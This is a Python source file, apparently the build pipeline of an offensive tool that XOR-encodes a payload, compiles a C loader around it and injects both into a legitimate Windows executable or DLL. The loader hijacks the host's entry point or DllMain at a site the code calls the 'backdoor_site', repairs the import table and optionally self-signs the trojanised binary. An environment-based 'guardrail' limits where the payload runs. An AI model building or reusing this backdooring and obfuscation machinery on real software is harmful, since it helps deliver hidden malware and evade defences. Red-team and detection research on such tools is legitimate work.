from __future__ import annotations

import hashlib
import os
import platform
import shutil
import sys
import tempfile
from pathlib import Path
from typing import Any, Callable

from jinja2 import Environment, StrictUndefined

from . import __version__
from .artifacts import sha256_bytes, sha256_file, utc_run_id, write_json
from .compatibility import (
    CompatibilityError,
    analyze_compatibility,
)
from .config import BuildConfig, KEYED_DECODERS
from .modules import ModuleManifest, ModuleRegistry
from .pe.injector import PEInjector
from .profiles import resolve_profile, resolve_toolchain_name
from .signing import SigningError, sign_pe
from .toolchains import create_toolchain


class BuildError(RuntimeError):
    pass


BuildProgress = Callable[[int, str], None]


def _report(progress: BuildProgress | None, percent: int, message: str) -> None:
    if progress is not None:
        progress(percent, message)


def _declared_imports(modules: list[ModuleManifest]) -> dict[str, str]:
    result: dict[str, str] = {}
    for module in modules:
        for declaration in module.required_imports:
            if "!" not in declaration:
                raise BuildError(
                    f"{module.qualified_name}: import must be DLL!Function: {declaration}"
                )
            dll, name = declaration.split("!", 1)
            previous = result.get(name.lower())
            if previous is not None and previous.lower() != dll.lower():
                raise BuildError(f"conflicting DLL declarations for imported API {name}")
            result[name.lower()] = dll
    return result


_MASK64 = (1 << 64) - 1


def _xor_stream_seed(xor_key: bytes) -> int:
    if not 5 <= len(xor_key) <= 10:
        raise BuildError("xor_stream requires 5-10 bytes of key material")
    seed = int.from_bytes(
        hashlib.sha256(b"supergiga:xor_stream:v1\0" + xor_key).digest()[:8],
        "little",
    )
    return seed or 0x9E3779B97F4A7C15


def _xor_stream_next(state: int) -> int:
    state ^= (state << 13) & _MASK64
    state ^= state >> 7
    state ^= (state << 17) & _MASK64
    return state & _MASK64


def _encode_payload(payload: bytes, decoder: str, xor_key: bytes) -> bytes:
    if decoder == "plain":
        return payload
    if decoder == "xor":
        if not 5 <= len(xor_key) <= 10:
            raise BuildError("xor requires a 5-10 byte key")
        return bytes(
            value ^ xor_key[index % len(xor_key)]
            for index, value in enumerate(payload)
        )
    if decoder == "xor_stream":
        state = _xor_stream_seed(xor_key)
        encoded = bytearray(len(payload))
        for index, value in enumerate(payload):
            state = _xor_stream_next(state)
            encoded[index] = value ^ (state & 0xFF)
        return bytes(encoded)
    raise BuildError(f"no payload encoder for decoder {decoder}")


def _utf16_assignments(variable: str, value: str) -> tuple[int, str]:
    encoded = value.encode("utf-16-le")
    units = [
        int.from_bytes(encoded[index : index + 2], "little")
        for index in range(0, len(encoded), 2)
    ]
    units.append(0)
    return len(units), "\n".join(
        f"    {variable}[{index}] = 0x{unit:04X};"
        for index, unit in enumerate(units)
    )


def _redact_command_line(command_line: list[str] | None) -> list[str]:
    result = list(command_line or [])
    for index, argument in enumerate(result):
        if argument == "--guardrail-value" and index + 1 < len(result):
            result[index + 1] = "<redacted>"
        elif argument.startswith("--guardrail-value="):
            result[index] = "--guardrail-value=<redacted>"
    return result


def _guardrail_context(
    module: ModuleManifest, value: str | None
) -> tuple[dict[str, str], dict[str, str | None]]:
    if module.name == "none":
        if value is not None and value.strip():
            raise BuildError("guardrail_value requires a non-none guardrail")
        return {}, {"module": "none", "expected_sha256": None}

    if value is None or not value.strip():
        raise BuildError(f"{module.qualified_name} requires --guardrail-value")
    if "\x00" in value:
        raise BuildError("guardrail_value cannot contain a NUL character")
    if len(value.encode("utf-16-le")) // 2 > 255:
        raise BuildError("guardrail_value cannot exceed 255 UTF-16 code units")

    environment_name = module.config.get("environment_name")
    if not isinstance(environment_name, str) or not environment_name:
        raise BuildError(
            f"{module.qualified_name}: environment_name must be a non-empty string"
        )
    environment_size, environment_assignments = _utf16_assignments(
        "environment", environment_name
    )
    expected_size, expected_assignments = _utf16_assignments("expected", value)
    return (
        {
            "guardrail_environment_size": str(environment_size),
            "guardrail_environment_assignments": environment_assignments,
            "guardrail_expected_size": str(expected_size),
            "guardrail_expected_assignments": expected_assignments,
        },
        {
            "module": module.name,
            "expected_sha256": sha256_bytes(value.encode("utf-8")),
        },
    )


def _publish_output(staged: Path, output: Path, expected_sha256: str) -> None:
    output.parent.mkdir(parents=True, exist_ok=True)
    handle = tempfile.NamedTemporaryFile(
        prefix=f".{output.name}.",
        suffix=".publish",
        dir=output.parent,
        delete=False,
    )
    temporary = Path(handle.name)
    handle.close()
    try:
        shutil.copyfile(staged, temporary)
        if sha256_file(temporary) != expected_sha256:
            raise BuildError("published output staging copy failed hash verification")
        os.replace(temporary, output)
    finally:
        temporary.unlink(missing_ok=True)


def _execution_environment_evidence(
    profile_name: str, artifact_dir: Path
) -> dict[str, Any]:
    del artifact_dir
    return {"profile": profile_name}


def build(
    config: BuildConfig,
    command_line: list[str] | None = None,
    progress: BuildProgress | None = None,
) -> dict[str, Any]:
    _report(progress, 5, "Validating build inputs")
    try:
        compatibility = analyze_compatibility(config)
        compatibility.require_buildable()
    except CompatibilityError as exc:
        raise BuildError(str(exc)) from exc
    profile = resolve_profile(config.profile)
    toolchain_name = resolve_toolchain_name(config.toolchain, profile)
    toolchain = create_toolchain(toolchain_name)

    config.artifact_dir.mkdir(parents=True, exist_ok=True)
    build_dir = config.artifact_dir / "build"
    build_dir.mkdir(parents=True, exist_ok=True)

    _report(progress, 15, "Discovering and validating recipe modules")
    registry = ModuleRegistry(config.modules_root).discover()
    registry.validate_all()
    selected = registry.select(config.recipe)
    imports = _declared_imports(selected)
    guardrail_module = next(
        module for module in selected if module.slot == "guardrail"
    )
    guardrail_context, guardrail_evidence = _guardrail_context(
        guardrail_module, config.guardrail_value
    )
    memory_module = next(module for module in selected if module.slot == "memory")
    pe_invoke_module = next(
        module for module in selected if module.slot == "pe_invoke"
    )
    host_kind = pe_invoke_module.config.get("host_kind", "exe")
    payload_alignment = memory_module.config.get("payload_alignment", 16)
    placement_mode = memory_module.config.get("placement_mode", "in_place")
    page_isolation = bool(
        memory_module.config.get("page_isolation", False)
    )
    payload_location = (
        (
            "rdata"
            if placement_mode in {"allocation", "split_image"}
            else "code"
        )
        if config.payload_location == "auto"
        else config.payload_location
    )
    iat_policy = config.effective_iat_policy
    invocation_strategy = pe_invoke_module.config.get(
        "invocation_strategy", "overwrite"
    )
    invocation_target = pe_invoke_module.config.get(
        "invocation_target",
        "dllmain" if host_kind == "dll" else "entrypoint",
    )
    _report(progress, 25, "Validating payload and injectable capacity")
    payload = config.payload.read_bytes()
    payload_pe: dict[str, Any] | None = None
    if config.payload_kind == "dll":
        payload_pe = {
            "machine": "AMD64",
            "image_size": compatibility.payload.image_size,
            "entrypoint_rva": compatibility.payload.entrypoint_rva,
            "sections": compatibility.payload.section_count,
            "loader_subset": {
                "imports": True,
                "dir64_relocations": True,
                "section_protections": True,
                "tls_callbacks": False,
                "delay_imports": False,
                "clr": False,
            },
        }
    encoded_payload = _encode_payload(payload, config.recipe.decoder, config.xor_key)
    xor_stream_seed = (
        _xor_stream_seed(config.xor_key)
        if config.recipe.decoder == "xor_stream"
        else 0
    )

    _report(progress, 35, "Rendering carrier source")
    render_context = {
        "payload_len": len(payload),
        "xor_key_hex": config.xor_key.hex(),
        "xor_key_len": len(config.xor_key),
        "xor_key_values": ", ".join(
            f"0x{value:02X}" for value in config.xor_key
        ),
        "xor_stream_seed_hex": f"{xor_stream_seed:016X}",
        **guardrail_context,
    }
    fragments = {
        module.slot: module.render(render_context)
        for module in selected
    }
    environment = Environment(undefined=StrictUndefined, keep_trailing_newline=True)
    carrier_source = environment.from_string(
        config.template_path.read_text(encoding="utf-8")
    ).render(fragments=fragments, **render_context)
    source_path = build_dir / "carrier.c"
    source_path.write_text(carrier_source, encoding="utf-8")

    _report(progress, 45, f"Initializing the {toolchain_name} x64 toolchain")
    carrier = toolchain.compile_carrier(
        source_path,
        build_dir,
        {name: dll for name, dll in imports.items()},
    )
    actual_imports = {fixup.name.lower() for fixup in carrier.import_fixups}
    undeclared = actual_imports - set(imports)
    if undeclared:
        raise BuildError(f"carrier emitted undeclared imports: {', '.join(sorted(undeclared))}")

    _report(progress, 62, "Revalidating compatibility before PE mutation")
    fresh_registry = ModuleRegistry(config.modules_root).discover()
    fresh_registry.validate_all()
    try:
        mutation_compatibility = analyze_compatibility(
            config,
            registry=fresh_registry,
            toolchain=toolchain,
        )
        mutation_compatibility.require_buildable()
    except CompatibilityError as exc:
        raise BuildError(str(exc)) from exc
    if mutation_compatibility.input_digest != compatibility.input_digest:
        raise BuildError(
            "compatibility input digest changed before PE mutation"
        )

    _report(progress, 68, "Carrier compiled; injecting into the selected host")
    injector = PEInjector()
    staged_output = build_dir / f"staged-output{config.output.suffix.lower()}"
    staged_output.unlink(missing_ok=True)
    try:
        injection = injector.inject(
            config.host.resolve(),
            staged_output,
            config.artifact_dir.resolve(),
            carrier,
            encoded_payload,
            payload_alignment=payload_alignment,
            payload_location=payload_location,
            page_isolation=page_isolation,
            placement_mode=str(placement_mode),
            execution_alignment=int(
                memory_module.config.get(
                    "execution_alignment", payload_alignment
                )
            ),
            iat_policy=iat_policy,
            invocation_strategy=invocation_strategy,
            invocation_target=invocation_target,
            process_attach_behavior=pe_invoke_module.config.get(
                "process_attach_behavior"
            ),
            dll_export=config.dll_export,
            host_kind=host_kind,
            expected_iat_repairs=mutation_compatibility.planned_repairs,
            expected_host_sha256=mutation_compatibility.injectable.sha256,
            expected_layout_digest=(
                mutation_compatibility.injectable.layout.digest
                if mutation_compatibility.injectable.layout is not None
                else None
            ),
            expected_payload_rva=(
                next(
                    (
                        int(item["start_rva"])
                        for item in (
                            mutation_compatibility.placement_plan or {}
                        ).get("allocations", [])
                        if item["name"] == "payload"
                    ),
                    None,
                )
            ),
            expected_destination_rva=(
                next(
                    (
                        int(item["start_rva"])
                        for item in (
                            mutation_compatibility.placement_plan or {}
                        ).get("allocations", [])
                        if item["name"] == "destination"
                    ),
                    None,
                )
            ),
            expected_backdoor_site=(
                (mutation_compatibility.invocation_plan or {}).get(
                    "backdoor_site"
                )
            ),
        )
        signing = None
        if config.self_sign or profile.signing_required:
            _report(progress, 82, "Self-signing and timestamping the output PE")
            try:
                signing = sign_pe(
                    staged_output,
                    injectable_path=config.host.resolve(),
                    progress=progress,
                )
            except SigningError as exc:
                raise BuildError(str(exc)) from exc

        _report(progress, 92, "Writing the build manifest and evidence")
        injection_evidence = injection.to_dict()
        injection_evidence["output"] = str(config.output.resolve())
        manifest: dict[str, Any] = {
            "schema": 3,
            "run_id": config.artifact_dir.name or utc_run_id(),
            "barrel_giga_version": __version__,
            "python": sys.version,
            "platform": platform.platform(),
            "execution_environment": _execution_environment_evidence(
                profile.name, config.artifact_dir.resolve()
            ),
            "command_line": _redact_command_line(command_line),
            "profile": profile.name,
            "toolchain": toolchain_name,
            "compatibility": mutation_compatibility.to_dict(),
            "iat_policy": iat_policy,
            "payload_location": {
                "requested": config.payload_location,
                "effective": payload_location,
            },
            "dll_export": config.dll_export,
            "repair_missing_iat": iat_policy == "auto",
            "signing_required": profile.signing_required,
            "guardrail": guardrail_evidence,
            "recipe": [
                {
                    "slot": module.slot,
                    "name": module.name,
                    "qualified_name": module.qualified_name,
                    "digest": module.digest,
                    "required_imports": list(module.required_imports),
                    "requires": list(module.requires),
                    "conflicts": list(module.conflicts),
                    "fixture_only": module.fixture_only,
                    "host_behavior": module.host_behavior,
                    "config": module.config,
                }
                for module in selected
            ],
            "inputs": {
                "host": {
                    "path": str(config.host.resolve()),
                    "size": config.host.stat().st_size,
                    "sha256": sha256_file(config.host),
                },
                "payload": {
                    "path": str(config.payload.resolve()),
                    "size": len(payload),
                    "sha256": sha256_bytes(payload),
                    "encoded_sha256": sha256_bytes(encoded_payload),
                    "decoder": config.recipe.decoder,
                    "kind": config.payload_kind,
                    "pe": payload_pe,
                    "xor_key_hex": (
                        config.xor_key.hex()
                        if config.recipe.decoder in KEYED_DECODERS
                        else None
                    ),
                    "decoder_parameters": (
                        {
                            "algorithm": "xorshift64-13-7-17-v1",
                            "seed_derivation": "sha256-domain-key-le64",
                            "derived_seed_hex": f"{xor_stream_seed:016X}",
                        }
                        if config.recipe.decoder == "xor_stream"
                        else None
                    ),
                },
            },
            "carrier": carrier.to_dict(),
            "injection": injection_evidence,
            "signing": (
                signing.to_dict() if signing is not None else {"enabled": False}
            ),
        }
        manifest_path = config.artifact_dir / "manifest.json"
        write_json(manifest_path, manifest)
        expected_output_sha256 = (
            signing.signed_output_sha256
            if signing is not None
            else injection.unsigned_output_sha256
        )
        _publish_output(staged_output, config.output.resolve(), expected_output_sha256)
    finally:
        staged_output.unlink(missing_ok=True)
    _report(progress, 100, f"Build complete: {config.output}")
    return manifest
